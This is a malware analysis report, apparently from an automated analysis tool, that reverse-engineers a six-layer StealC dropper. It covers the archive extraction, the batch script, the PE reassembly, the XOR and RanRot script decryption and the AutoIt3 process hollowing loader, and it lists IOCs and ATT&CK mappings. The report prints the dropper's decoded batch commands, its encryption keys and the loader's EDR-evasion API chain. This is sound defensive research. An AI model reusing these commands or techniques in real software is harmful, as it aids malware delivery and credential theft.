# Malware Analysis Report: StealC 6-Layer AutoIt3 Process Hollowing Loader

**Analyst:** Arkana Automated Analysis (multi-session)
**Date:** 2026-03-29
**Classification:** Information Stealer / Loader / Process Hollowing Injector
**Risk Level:** CRITICAL (70/100 outer shell, 180/100 inner AutoIt3)
**Source:** Malware Bazaar (uploaded 2026-03-28, same day as analysis)
**Attribution:** StealC family, AsgardProtector, dropped by OffLoader campaign

---

## 1. Executive Summary

This report documents the **complete 6-layer reverse engineering of a StealC dropper** — a sophisticated multi-stage delivery chain that weaponizes Microsoft's own `wextract.exe`, reconstructs AutoIt3 from PE fragments, and uses a custom-encrypted AutoIt3 script to inject the final StealC payload via process hollowing. The analysis required cracking the AutoIt3 **RanRot PRNG** encryption, which standard decompilers (autoit-ripper, Exe2Aut, refinery) all failed to handle.

The outer sample is a **PE32+ (x64) IExpress self-extracting archive** (3 MB) containing a Microsoft Cabinet with 6 files using decoy names (Accessories, Satisfaction.flv, Sugar, etc.). An obfuscated batch script (`Satisfaction.flv`) is piped through `cmd.exe` — it reassembles **AutoIt3.exe from 4 PE fragments** and executes a 2.2 MB encrypted AutoIt3 script. The script itself is a **process hollowing loader** that injects a compressed StealC PE into a legitimate Windows process using NUMA-aware memory allocation and ntdll direct syscalls to evade EDR hooks.

**Key findings:**
- **6-layer matryoshka architecture**: IExpress SFX → obfuscated batch → PE fragment reassembly → 8-byte XOR → RanRot PRNG encryption → process hollowing loader
- **AutoIt3 RanRot PRNG decryption cracked**: Modified AutoIt3 uses RanRot (rotate-and-add, NOT Mersenne Twister) for script encryption; key `0x18EE`, seeded via LCG with multiplier `0x53A9B4FB`
- **Batch script injection via `type | %comspec%`**: Satisfaction.flv (disguised as video) piped through cmd.exe for fileless execution
- **PE fragment reassembly**: AutoIt3.exe reconstructed from 4 cabinet files (Accessories + Revision + Assignments + Sugar) with "MZ" header written separately
- **41 DllCall APIs for process hollowing**: `VirtualAllocExNuma` (NUMA sandbox evasion) + `NtWriteVirtualMemory` + `NtSetContextThread` + `NtResumeThread`
- **Anti-analysis**: `DriveGetSerial()` (VM detection), `GetActiveProcessorCount` (core count check), `NtQueryInformationProcess` (debugger detection), `CallWindowProc` (callback shellcode trigger)
- **C2 at 83.142.209.192** (from MalwareBazaar tags; not present in AutoIt script — embedded in injected PE)

---

## 2. Sample Information

### Outer Dropper

| Property | Value |
|----------|-------|
| **Filename** | `sunwukongs.exe` (Malware Bazaar) |
| **SHA-256** | `de6aa3a1a821b8a321bcbebf0a467166f5433ca2e3c1e50a7d11bcf9663aa09b` |
| **MD5** | `cf3627ad2740c989fa2079818d924acf` |
| **SHA-1** | `528d80dda4e24ac2c16ecc3b460f4b385d34d684` |
| **Imphash** | `4cea7ae85c87ddc7295d39ff9cda31d1` |
| **File Size** | 3,046,912 bytes (3.0 MB) |
| **Format** | PE32+ (x64), Windows GUI subsystem |
| **Compiler** | MSVC + Delphi (Rich header: 8 unique product IDs) |
| **Signed** | No |
| **Sections** | 6 (`.text` 31 KB, `.rdata` 9 KB, `.data` 1 KB, `.pdata`, `.rsrc` 3 MB, `.reloc`) |
| **Imports** | 8 DLLs, 156 functions |
| **PEiD** | FSG v1.10, MEW 10, Stealth PE 1.01, Armadillo v4.x, ASProtect v1.32, tElock 1.0, PE Pack v1.0 |
| **Malware Bazaar Tags** | `StealC`, `AsgardProtector`, `dropped-by-OffLoader`, `83-142-209-192` |

### Reconstructed AutoIt3 Interpreter

| Property | Value |
|----------|-------|
| **Reconstructed As** | `Cardiovascular.exe` (reassembled from 4 PE fragments) |
| **SHA-256** | `881619a47b62b52305d92640cc4d4845a279c23a5a749413785fc8fcb0fdf7fb` |
| **File Size** | 1,108,064 bytes (1.1 MB) |
| **Format** | PE32+ (x64), Windows GUI subsystem |
| **Imports** | 18 DLLs, 541 functions |
| **Signed** | Yes (GlobalSign — legitimate AutoIt3 signature) |

### Encrypted AutoIt3 Script

| Property | Value |
|----------|-------|
| **Original Name** | `Yukon.flv` (renamed to `U` at runtime) |
| **Size** | 2,202,295 bytes (2.2 MB) |
| **Entropy** | 8.00 (fully encrypted) |
| **Format** | EA05/EA06 AutoIt3 compiled script |
| **Encryption** | 8-byte XOR (outer) + RanRot PRNG (inner) |
| **XOR Key** | `47a9c5aa5b3f8a50` |
| **RanRot Key** | `0x18EE` (standard EA06 au3_ResType) |
| **Decompressed Script** | 7,233,821 bytes → 3,921,096 chars, 15,299 lines |

---

## 3. Architecture Overview

```
Layer 1: sunwukongs_stealc.exe (wextract.exe IExpress SFX, 3.0 MB)
  └─ RCDATA resource: MSCF cabinet (2.69 MB)
     ├── Accessories         (666 B)   — PE fragment (header)
     ├── Satisfaction.flv    (7,543 B) — obfuscated batch script
     ├── Assignments         (417 KB)  — PE fragment (code)
     ├── Sugar               (198 KB)  — PE fragment (data)
     ├── Yukon.flv           (2.1 MB)  — encrypted AutoIt3 script
     └── Revision            (491 KB)  — PE fragment (sections)

Layer 2: Satisfaction.flv (batch script, piped via cmd.exe)
  └─ 25 Set variable commands + random-word junk noise
  └─ Decoded: PE reassembly + AutoIt3 execution

Layer 3: Cardiovascular.exe (AutoIt3.exe, reassembled from fragments)
  └─ MZ header written by batch + Accessories + Revision + Assignments + Sugar
  └─ Legitimate signed AutoIt3 interpreter (LOLBIN)

Layer 4: XOR Encryption (key: 47a9c5aa5b3f8a50)
  └─ First 303 bytes of script file
  └─ Decrypts to AU3!EA06 header + metadata

Layer 5: RanRot PRNG Encryption (key: 0x18EE)
  └─ Custom PRNG: rotl32(9) + rotl32(13), 17-element circular buffer
  └─ LCG seed expansion: multiplier 0x53A9B4FB, 17 iterations
  └─ 7.2 MB script decompressed via AutoIt LZSS

Layer 6: Process Hollowing Loader (3.9M char AutoIt3 source)
  └─ 41 DllCall APIs for injection
  └─ VirtualAllocExNuma + NtWriteVirtualMemory
  └─ Injects compressed StealC PE → credential theft
```

---

## 4. Layer 1: IExpress Self-Extracting Archive

The outer binary is a weaponized copy of Microsoft's `wextract.exe` — the standard IExpress self-extracting archive handler. YARA matched `wextract.pdb` in the debug directory. The binary's 3 MB `.rsrc` section (entropy 7.93) contains a single MSCF (Microsoft Cabinet) resource at file offset `0x557bc`.

The cabinet was extracted using `search_hex_pattern` to locate the `MSCF` magic, then `refinery_pipeline` to carve the raw bytes, followed by `refinery_extract(operation='archive', sub_operation='cab')` on the carved data. Six files were recovered with deliberately innocuous names.

The IExpress configuration was decoded from RCDATA resources:

| Resource | Value | Purpose |
|----------|-------|---------|
| `RUNPROGRAM` | `at.exe hdhf84843isljdfj89234jkjs` | Primary execution |
| `POSTRUNPROGRAM` | `cmd /c KgUg & type Satisfaction.flv \| %comspec% & ping -n 5 localhost` | Batch script injection |
| `TITLE` | `DAYS FAMILY PK REPRESENT BROS REMAINS CRUZ YR` | Randomized SFX title |
| `ADMQCMD` | `<None>` | No admin command |
| `EXTRACTOPT` | `03000000` | Extract and run |

---

## 5. Layer 2: Obfuscated Batch Script

`Satisfaction.flv` is a batch script disguised with a video file extension. The IExpress `POSTRUNPROGRAM` command pipes it through `cmd.exe` using the `type Satisfaction.flv | %comspec%` technique — a fileless execution method that avoids writing a `.bat` file to disk.

The script uses **variable substitution obfuscation**: 25 `Set` commands define single characters, interspersed with junk lines containing random English words that serve as noise to evade static detection:

```batch
Set Folk=/           Set Replies=B        Set Searched=w
Set Latinas=d        Set Packets=7        Set Vcr=s
Set Aircraft=S       Set Beaver=m         Set Competing=.
# ... 16 more variables
```

Decoded commands:

```batch
Set CYZw=Cardiovascular.exe
Set /a Should=464419
md 464419
cmd /c set /p ="MZ" > 464419\Cardiovascular.exe <nul
cmd /c findstr /V "Again" Accessories >> 464419\Cardiovascular.exe
cmd /c copy /b /y 464419\Cardiovascular.exe + Revision + Assignments + Sugar 464419\Cardiovascular.exe
cmd /c copy /b /y ..\Yukon.flv U
Cardiovascular.exe U
start /w Cardiovascular.exe /AutoIt3ExecuteLine "Sleep(15957)"
```

The `/AutoIt3ExecuteLine "Sleep(15957)"` parameter confirms the reconstructed binary is **AutoIt3.exe**.

---

## 6. Layer 3: PE Fragment Reassembly

The batch script reconstructs a valid PE by binary-concatenating four cabinet files:

1. Writes `MZ` (2 bytes) — the DOS header magic
2. Appends `Accessories` (minus the "Again" marker line) — PE header + early sections
3. Binary-concatenates `Revision` (491 KB) + `Assignments` (417 KB) + `Sugar` (198 KB)

The result is `Cardiovascular.exe` — a valid PE32+ x64 binary with 7 sections, 18 DLLs, 541 imports, and a **valid GlobalSign digital signature**. This is a legitimate AutoIt3 interpreter, fragmented to evade file-based AV scanning. The Authenticode signature survives reassembly because it's in the PE overlay (appended after the PE data).

---

## 7. Layer 4–5: Script Encryption (8-byte XOR + RanRot PRNG)

### Outer XOR Layer

The encrypted script file (`Yukon.flv`, renamed to `U`) has entropy 8.00. Known-plaintext analysis against the expected `AU3!EA06` header yielded the 8-byte XOR key `47a9c5aa5b3f8a50`, decrypting the first 303 bytes to reveal the script metadata.

### Inner RanRot PRNG Layer

The EA05 magic at offset 303 marks the start of the standard AutoIt3 compiled script format. However, **all standard decompilers failed** — autoit-ripper, refinery's AutoIt decompiler, and myAut2Exe could not parse the file.

Investigation revealed the root cause: **the binary uses RanRot PRNG for script decryption, NOT Mersenne Twister**. This was confirmed by:

1. **Static analysis** of the AutoIt3 binary: the MT19937 implementation (at VA `0x1400895e0`) is used ONLY for AutoIt3's `Random()`/`SRandom()` functions — it has exactly 2 callers, both for dynamic seeding
2. **Function tracing** through the script parser: `sub_14008a778` calls `sub_14008a00c` (decrypt) with key `6382` (`0x18EE`), which calls `sub_140089e58` (RanRot seed) + `sub_140089fd4` (RanRot get_byte)
3. **Disassembly** of the RanRot core (`sub_140089edc`): `rotl32(state[p1], 9) + rotl32(state[p2], 13)` with 17-element circular buffer

RanRot PRNG parameters:

| Parameter | Value |
|-----------|-------|
| Algorithm | RanRot (rotate-and-add) |
| State size | 17 DWORDs + 2 indices |
| Rotation constants | 9, 13 |
| Seeding | LCG: `state[i] = 1 - prev * 0x53A9B4FB` |
| Warm-up | 9 PRNG steps after seeding |
| Byte generation | 2 steps → float → `floor(val / 2^32 * 256)` |
| Script key (au3_ResType) | `0x18EE` (standard EA06, unchanged) |
| Content key (au3_ResContent) | `0x2477` (direct, no checksum addition) |
| Compression | AutoIt LZSS (7,233,821 bytes decompressed) |
| Deassembly | autoit-ripper `deassemble_script()` → 3,921,096 chars source |

---

## 8. Layer 6: Process Hollowing Loader

The decompiled AutoIt3 script is **not the stealer itself** — it is a 15,299-line process hollowing loader that injects a compressed PE payload into a legitimate Windows process.

### Obfuscation

All strings are encoded via a `REVEALS()` function using numeric R-separated encoding with variable offsets:

```autoit
REVEALS("85R118R116R107R112R105R75R117R72R110R113R99R118", 2 + 0)
; Decodes to an API name or string by subtracting offset from each number
```

Function and variable names are random English word concatenations: `DIVSETTINGSDENTALATTACKS`, `$ZIMBABWETRAVELLING`, `$COLOMBIAFARMASONKARMA`. Control flow is obfuscated with `While 498 / Switch` patterns.

### API Usage (41 unique DllCall targets)

**Process hollowing chain:**

| Step | API | DLL | Purpose |
|------|-----|-----|---------|
| 1 | `CreateToolhelp32Snapshot` | kernel32.dll | Enumerate processes |
| 2 | `Process32FirstW` / `Process32NextW` | kernel32.dll | Find target process |
| 3 | `CreateProcessW` | kernel32.dll | Create suspended target |
| 4 | `VirtualAllocExNuma` | kernel32.dll | Allocate in target (NUMA evasion) |
| 5 | `NtWriteVirtualMemory` | ntdll.dll | Write PE payload |
| 6 | `NtProtectVirtualMemory` | ntdll.dll | Set RWX permissions |
| 7 | `GetThreadContext` | kernel32.dll | Read thread state |
| 8 | `NtSetContextThread` | ntdll.dll | Redirect entry point |
| 9 | `NtResumeThread` | ntdll.dll | Execute payload |

**Anti-analysis:**

| Technique | API/Method | Purpose |
|-----------|-----------|---------|
| VM detection | `DriveGetSerial()` | Check drive serial for VM signatures |
| Core count | `GetActiveProcessorCount` | VMs typically have 1–2 cores |
| NUMA check | `VirtualAllocExNuma` | Fails in some sandboxes |
| Debugger | `NtQueryInformationProcess` | ProcessDebugPort check |
| PEB check | Struct `BeingDebugged` | Direct PEB read |
| Callback execution | `CallWindowProc` | Shellcode via window procedure callback |

**Evasion:**
- All memory operations use **ntdll direct syscalls** (`NtRead/WriteVirtualMemory`, `NtProtect`, `NtFree`, `NtResume`) to bypass user-mode API hooks deployed by EDR products
- **RtlDecompressFragment** used to decompress the embedded PE payload in-memory
- No C2 communication in the AutoIt script — the C2 address (83.142.209.192) is embedded in the injected StealC PE

---

## 9. MITRE ATT&CK Mapping

| ID | Technique | Tactic | Evidence |
|----|-----------|--------|----------|
| T1027.002 | Software Packing | Defense Evasion | AsgardProtector wrapping IExpress SFX |
| T1027.009 | Embedded Payloads | Defense Evasion | PE fragments in cabinet, encrypted script in Yukon.flv |
| T1059.003 | Windows Command Shell | Execution | `type Satisfaction.flv \| %comspec%` batch piping |
| T1059.010 | AutoIt | Execution | AutoIt3 interpreter executing encrypted .a3x script |
| T1036.007 | Double File Extension | Defense Evasion | Satisfaction.flv (batch), Yukon.flv (AutoIt3 script) |
| T1055.012 | Process Hollowing | Defense Evasion | CreateProcessW → NtWriteVirtualMemory → NtSetContextThread → NtResumeThread |
| T1106 | Native API | Execution | ntdll direct syscalls (NtWriteVirtualMemory, NtProtectVirtualMemory) |
| T1134 | Access Token Manipulation | Privilege Escalation | AdjustTokenPrivileges + SeShutdownPrivilege |
| T1140 | Deobfuscate/Decode | Defense Evasion | RanRot PRNG decryption, REVEALS() string encoding, LZSS decompression |
| T1497.001 | System Checks | Defense Evasion | DriveGetSerial, GetActiveProcessorCount, VirtualAllocExNuma, NtQueryInformationProcess |
| T1547.001 | Registry Run Keys | Persistence | RunOnce `wextract_cleanup%d` |
| T1218.011 | Rundll32 | Defense Evasion | `rundll32.exe advpack.dll,DelNodeRunDLL32` for cleanup |

*12 techniques across 4 tactics (Execution, Defense Evasion, Persistence, Privilege Escalation)*

---

## 10. Indicators of Compromise

### File Hashes

| Stage | SHA-256 | Description |
|-------|---------|-------------|
| Outer dropper | `de6aa3a1...09b` | wextract.exe IExpress SFX |
| Cabinet | `0256f124...1ee` | MSCF cabinet from RCDATA |
| AutoIt3.exe | `881619a4...7fb` | Reconstructed from 4 fragments |
| Encrypted script | `19fa2b7f...cd3` | Yukon.flv (8-byte XOR decrypted) |

### Network

| Type | Value | Context |
|------|-------|---------|
| IPv4 | `83.142.209.192` | C2 (MalwareBazaar tag, in injected PE) |

### Host

| Type | Value |
|------|-------|
| Registry | `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\wextract_cleanup*` |
| Path | `%WINDIR%\msdownld.tmp\464419\Cardiovascular.exe` |
| Filename | `Satisfaction.flv`, `Yukon.flv`, `Cardiovascular.exe` |
| SFX Title | `DAYS FAMILY PK REPRESENT BROS REMAINS CRUZ YR` |
| Command | `at.exe hdhf84843isljdfj89234jkjs` |
| Imphash | `4cea7ae85c87ddc7295d39ff9cda31d1` |

### Cryptographic Materials

| Material | Value |
|----------|-------|
| XOR key (outer) | `47a9c5aa5b3f8a50` (8 bytes) |
| RanRot key | `0x18EE` (au3_ResType) |
| RanRot content key | `0x2477` (au3_ResContent) |
| RanRot LCG multiplier | `0x53A9B4FB` |
| RanRot rotation constants | 9, 13 |

---

## 11. Why This Example

This sample demonstrates Arkana's capability to **peel through 6 distinct layers of protection** — from a legitimate Windows utility through obfuscated batch scripts, fragmented PE reconstruction, dual-layer custom encryption, to a fully deobfuscated process hollowing loader. The analysis required:

- **Cabinet extraction** from PE resources via hex pattern search and Binary Refinery
- **Batch script deobfuscation** by decoding variable substitution with junk-word noise
- **PE reconstruction** matching the exact batch script logic (MZ header + `findstr /V` + `copy /b`)
- **Cryptographic analysis** identifying the 8-byte XOR key from known plaintext (`AU3!EA06`)
- **Algorithm identification** discovering the binary uses RanRot PRNG (not MT19937) through static analysis of the AutoIt3 interpreter, tracing from the script parser through the type dispatcher to the actual PRNG implementation
- **Full script decompression** using autoit-ripper's LZSS decompressor on the RanRot-decrypted data
- **API extraction** decoding 21,734 obfuscated strings to reveal the 41-API process hollowing toolkit

The RanRot discovery is particularly significant: all existing open-source AutoIt3 decompilers assume Mersenne Twister for script encryption. Modified AutoIt3 binaries using RanRot (as documented in the myAut2Exe/myaut_contrib projects) require algorithm-aware decryption that standard tools cannot provide.
